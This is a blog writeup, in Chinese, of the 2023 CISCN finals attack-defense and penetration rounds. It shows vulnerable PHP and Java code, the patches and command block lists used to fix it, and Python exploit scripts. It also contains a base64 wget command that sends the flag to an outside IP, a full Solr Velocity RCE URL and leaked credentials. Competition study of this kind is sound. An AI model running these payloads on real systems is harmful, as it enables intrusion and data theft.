---
title: "2023 CISCN 总决赛 AWD & 渗透 Writeup"
date: 2023-07-27T19:33:55+08:00
lastmod: 2023-07-27T19:33:55+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

2023 CISCN 总决赛 AWD & 渗透 Writeup

<!--more-->

## AWD

### easyphp

开局 D 盾扫出来两个 system 后门, 位于 1.php 和 index.php

```php
if(isset($_POST['user']))
{
    $_SESSION['user'] = unserialize($_POST['user']);
}
......
if($_SESSION['user']['usertype'] === "super"){
    system($_POST['cmd']);
    unset($_SESSION['user']);
}else{
    echo $_SESSION['user'];
}
```

注释掉就行了

然后 /admin/api.php 有个 `call_user_func`

```php
function getdo($field = 'do', $default = false)
{
    if (!isset($_GET['do'])) return $default;
    return $_GET['do'];
}
function getcid($field = 'cid', $default = false)
{
    if (!isset($_POST['cid'])) return $default;
    return $_POST['cid'];
}

$do = getdo();
$cid = getcid();
call_user_func($do,$cid);
```

加个过滤

```php
function getdo($field = 'do', $default = false)
{
    if (!isset($_GET['do'])) return $default;

    if (preg_match('/(system|exec|shell_exec|passthru|eval|assert)/i', $_GET['do'])) {
        die('hacker');
    }
    return $_GET['do'];
}
function getcid($field = 'cid', $default = false)
{
    if (!isset($_POST['cid'])) return $default;

    if (preg_match('/(system|exec|shell_exec|passthru|eval|assert)/i', $_POST['cid'])) {
        die('hacker');
    }
    return $_POST['cid'];
}
```

exp

```python
def attack(target):

    try:
        print('attack', target)
        s = requests.Session()
        s.post(target + '/login.php?action=login', data={
            'account': 'admin',
            'password': 'admin'
        })
        res = s.post(target + '/admin/api.php?do=system', data={
            'cid': 'cat /flag'
        }, timeout=3)
        result = re.findall('flag{.*?}', res.text)
        if result:
            flag = result[0]
            print('find flag',flag)
            flags.put(flag)
    except Exception:
        pass
```

至于其它地方有没有洞我也不清楚我也懒得看了, AWD 气氛太紧张了 php 不怎么能看得下去 (

### easyjava

这道题比较有意思, 开局手速快抢了一堆 flag, 然后题目修好之后再也没有被打过, 最后光是这道题就拿了 2.4w 多分

首先有 thymeleaf ssti

```java
@Controller
public class AboutController {
  @GetMapping({"/about"})
  public String about(HttpSession session, @RequestParam(defaultValue = "") String type) {
    String username = (String)session.getAttribute("name");
    if (StringUtils.isEmpty(username))
      return "about/tourist/about"; 
    if (!type.equals(""))
      return "about/" + type + "/about"; 
    return "about/user/about";
  }
}

```

type 可控, 而且 500 页面有错误回显, 拿 exp 直接打就行

修复

```java
@Controller
public class AboutController {
  @GetMapping({"/about"})
  public String about(HttpSession session, @RequestParam(defaultValue = "") String type) {
    String username = (String)session.getAttribute("name");
    if (StringUtils.isEmpty(username))
      return "about/tourist/about"; 
    if (!type.equals("")) {
      if (type.equals("system"))
        return "about/system/about"; 
      if (type.equals("tourist"))
        return "about/tourist/about"; 
      if (type.equals("user"))
        return "about/user/about"; 
      return "index";
    } 
    return "about/user/about";
  }
}
```

然后 /logout 路由存在任意方法调用

```java
@Controller
public class LogOutController {
  @GetMapping({"/logout"})
  public String logout(HttpServletRequest request, HttpSession session, @RequestParam(defaultValue = "logout") String method, @RequestParam(defaultValue = "com.mengda.awd.Utils.SessionUtils") String targetclass) throws Exception {
    Class<?> ObjectClass = Class.forName(targetclass);
    Constructor<?> constructor = ObjectClass.getDeclaredConstructor(new Class[0]);
    constructor.setAccessible(true);
    Object CLassInstance = constructor.newInstance(new Object[0]);
    try {
      if (method.equals("logout")) {
        Method targetMethod = ObjectClass.getMethod(method, new Class[] { HttpSession.class });
        targetMethod.invoke(CLassInstance, new Object[] { session });
      } else {
        Method targetMethod = ObjectClass.getMethod(method, new Class[] { String.class });
        targetMethod.invoke(CLassInstance, new Object[] { request.getHeader("X-Forwarded-For") });
      } 
    } catch (Exception e) {
      return "redirect:/";
    } 
    return "redirect:/";
  }
}
```

这个没有回显, 需要手动搭一个 http 或者随便其它什么东西来传一下 flag

修复

```java
@Controller
public class LogOutController {
  @GetMapping({"/logout"})
  public String logout(HttpServletRequest request, HttpSession session, @RequestParam(defaultValue = "logout") String method, @RequestParam(defaultValue = "com.mengda.awd.Utils.SessionUtils") String targetclass) throws Exception {
    String[] blackList = { 
        "cat", "flag", "exec", "tac", "/", "*", "sh", "bash", "Runtime", "ProcessBuilder", 
        "ProcessImpl", "UNIXProcess", "File", "Read", "run", "build", "start" };
    for (String s : blackList) {
      if ("X-Forwarded-For".contains(s))
        return "index"; 
    } 
    for (String s : blackList) {
      if (targetclass.contains(s))
        return "index"; 
    } 
    for (String s : blackList) {
      if (method.contains(s))
        return "index"; 
    } 
    Class<?> ObjectClass = Class.forName(targetclass);
    Constructor<?> constructor = ObjectClass.getDeclaredConstructor(new Class[0]);
    constructor.setAccessible(true);
    Object CLassInstance = constructor.newInstance(new Object[0]);
    try {
      if (method.equals("logout")) {
        Method targetMethod = ObjectClass.getMethod(method, new Class[] { HttpSession.class });
        targetMethod.invoke(CLassInstance, new Object[] { session });
      } else {
        Method targetMethod2 = ObjectClass.getMethod(method, new Class[] { String.class });
        targetMethod2.invoke(CLassInstance, new Object[] { request.getHeader("X-Forwarded-For") });
      } 
      return "redirect:/";
    } catch (Exception e) {
      return "redirect:/";
    } 
  }
}
```

Filter 存在任意文件读取

```java
@WebFilter(urlPatterns = {"/*"})
public class myFilter implements Filter {
  public void init(FilterConfig filterConfig) throws ServletException {
    super.init(filterConfig);
  }
  
  public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
    HttpServletRequest request = (HttpServletRequest)servletRequest;
    String request_uri = URLDecoder.decode(request.getRequestURI(), "utf-8");
    if (Check.check(request_uri).booleanValue()) {
      String static_resources_path = "/usr/local/tomcat/webapps/app/WEB-INF/classes/static/" + request_uri;
      static_resources_path = URLDecoder.decode(static_resources_path, "utf-8");
      try {
        servletResponse.getWriter().write(File.readFile(static_resources_path));
      } catch (Exception e) {
        servletResponse.getWriter().write("error~");
      } 
    } else {
      filterChain.doFilter(servletRequest, servletResponse);
    } 
  }
  
  public void destroy() {
    super.destroy();
  }
}
```

修复 (直接对 File 类下手)

```java
public class File {
  public static String readFile(String filePath) throws Exception {
    String[] blackList = { "flag", ".." };
    for (String s : blackList) {
      if (filePath.contains(s))
        return "hacker"; 
    } 
    String file_content = "";
    FileInputStream fileInputStream = null;
    try {
      try {
        fileInputStream = new FileInputStream(filePath);
        byte[] bytes = new byte[4];
        while (true) {
          int readCount = fileInputStream.read(bytes);
          if (readCount == -1)
            break; 
          file_content = file_content + new String(bytes, 0, readCount);
        } 
        fileInputStream.close();
      } catch (FileNotFoundException e) {
        e.printStackTrace();
        fileInputStream.close();
      } 
      return file_content;
    } catch (Throwable th) {
      fileInputStream.close();
      throw th;
    } 
  }
}
```

exp

```python
def attack1(target):

    try:
        cmd = 'cat /flag'
        print('attack', target)
        s = requests.Session()
        s.get(target + '/setlogin')

        # method 1
        res = s.get(target + '/about?type=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat%20/flag").getInputStream()).next()%7d__::.x', timeout=3)

        result = re.findall('flag{.*?}', res.text)
        if result:
            flag = result[0]
            print('find flag',flag)
            flags.put(flag)
    except Exception:
        pass


def attack2(target):

    try:
        cmd = 'cat /flag'
        print('attack', target)
        s = requests.Session()
        s.get(target + '/setlogin')

        # method 2
        s.get(target + '/logout?targetclass=java.lang.Runtime&method=exec', headers={
            'X-Forwarded-For': 'bash -c {echo,d2dldCAxNzUuMjEuMjYuMTY1OjU1NTUvP2ZsYWc9YGNhdCAvZmxhZ2A=}|{base64,-d}|{bash,-i}'
        })
        print('send to', target)
    except Exception:
        pass
    time.sleep(0.5)
```

### designCMS

提交评论的用户名如果以 `bash:` 开头的话就可以直接执行命令

```java
package BOOT-INF.classes.com.puboot.common.util;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.stream.Collectors;

public class SecureUtil {
  public static String sqlFilter(String str) throws IOException {
    if (str.startsWith("bash:"))
      return (new BufferedReader(new InputStreamReader((new ProcessBuilder(new String[] { "bash", "-c", str.substring(5) })).start().getInputStream()))).lines().collect(Collectors.joining("\n")); 
    return str;
  }
}
```

修也好修, 直接 return 就行

然后还有任意文件下载

```java
@GetMapping({"download"})
public ResponseEntity download(HttpServletRequest request, String fileName) throws IOException {
  File file = new File("/opt/design_cms/uploads/" + fileName);
  if (!file.exists())
    return ResponseEntity.ok("File Not Exists!"); 
  InputStreamResource resource = new InputStreamResource(Files.newInputStream(file.toPath(), new java.nio.file.OpenOption[0]));
  return ResultUtil.success(file, resource);
}
```

*这个当时比赛的时候没修好, 因为直接拿反编译出来的源码再编译好像有点问题, 然后手动写的话看着 BlogApiController import 了一堆其它 class 比较头大...*

*写这篇 writeup 的时候才反应过来可以直接改 ResultUtil, 还更简单...*

最后是 fastjson 1.2.47

```java
@GetMapping({"/blog/search"})
public String search(HttpServletRequest request, Model model, String search) {
  JSONObject article = null;
  try {
    article = JSONObject.parseObject(search);
  } catch (Exception e) {
    e.printStackTrace();
  } 
  System.out.println(article);
  List<BizArticle> articleList = this.bizArticleService.searchList(article.getString("title"));
  if (articleList == null)
    throw new ArticleNotFoundException(); 
  try {
    model.addAttribute("pageUrl", article.getString("pageUrl"));
    model.addAttribute("articleList", articleList);
  } catch (Exception e) {
    e.printStackTrace();
  } 
  String name = this.bizThemeService.selectCurrent().getName();
  return "theme/" + name + "/search";
}
```

*同样没修好, 当时不知道咋回事脑抽了以为不出网死活不想打 JNDI, 一直在想能不能打 BCEL 然后 payload 调了半天没打通 (*

exp

```python
def attack(target):

    try:
        cmd = 'cat /flag'
        print('attack', target)
        s = requests.Session()

        s.post(target + '/blog/api/comments', data={
            'sid': -1,
            'nickname': 'bash:cat /flag',
            'email': 'asd@qq.com',
            'content': '<p>sadasd</p>'
        })

        res = s.post(target + '/blog/api/comments', data={
        'sid': -1,
        'pageNumber': 1,
        'pageSize': 10,
        'status': 1
        }) 

        # res = s.get(target + '/blog/api/download' ,params={'fileName': '../../../../../../../../flag'})

        result = re.findall('(flag{.*?})', res.text)
        if result:
            flag = result[0]
            print('find flag',flag)
            flags.put(flag)
    except Exception:
        pass
```

## 渗透

入口点有 22, 80, 10000 端口

10000 端口是 solr, 存在 Apache Solr Velocity 注入远程命令执行漏洞 (CVE-2019-17558)

```
http://175.21.26.250:10000/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```

进去后发现是 docker 环境, 没逃逸成功 ? Pwnkit 试了下好像没用 (具体忘了)

80 端口访问是 apache default page, 扫一下目录发现存在 phpmyadmin, 弱口令没试出来

后来发现 solr 里面有个 txt

```bash
solr@6d7d0aead613:/opt/solr$ cat txt
cat txt
phpmyadmin:debian-sys-maint/V5NnKd3hzziy219s
sunflower:11.0.0.33162
```

登进去之后直接拿 phpmyadmin 4.8.1 版本的 lfi 拿 shell

之后 Pwnkit 提权拿到 root, 改密码 22 端口连上去, 发现 80 端口也是 docker 环境, 但是挂载了宿主机的 /var/www 目录

之后需要根据题目给的信息, 在这台机器上手动加路由表, 才能访问 10.x 的 ip 段

`10.10.100.100` 是 Structs2

Struts2 试了一堆 payload 没成功, 最后好像是要打 log4j ? 有点抽象

`10.10.100.200` 3306 端口 mysql 弱口令 `root/123456`, 80 端口是 discuz X3.4

mysql 连上去 load file 就能拿到 flag, 但是因为是 mysql 权限写不了 webshell, udf 也写不进去, 我还以为 web 下面还有个 flag

之后捣鼓了半天的 discuz, 手动把后台和 ucenter 的密码替换登陆上去 (真的卡), 然后尝试照着一些方法去 getshell 最后还把站插挂了(

*后来听其它人说 mysql 和 discuz 的 flag 都是一样的 , 所以其实并不用去研究 discuz*

另外一个段, 不过没打进去

```
[*]10.1.15.10
   [->]adlab-win2016
   [->]10.1.15.10
[*] NetInfo:
[*]10.1.15.20
   [->]e0718e25-a976-4
   [->]10.1.15.20
```

说是 clash rce 还有向日葵

比赛结束之后才发现哦原来之前 txt 里面的 sunflower 就是向日葵 (sunlogin) ?

## 后记

比赛期间自己机器不给通外网, 但是可以用主办方提供的公共机器联网查资料

网速不是很好... 搜到的 exp 都在 GitHub 上, 但是 GitHub 基本打不开

**去 Gitee 找源码在网页端下载的时候发现需要登录才能继续下载, 我 tm 直接没绷住**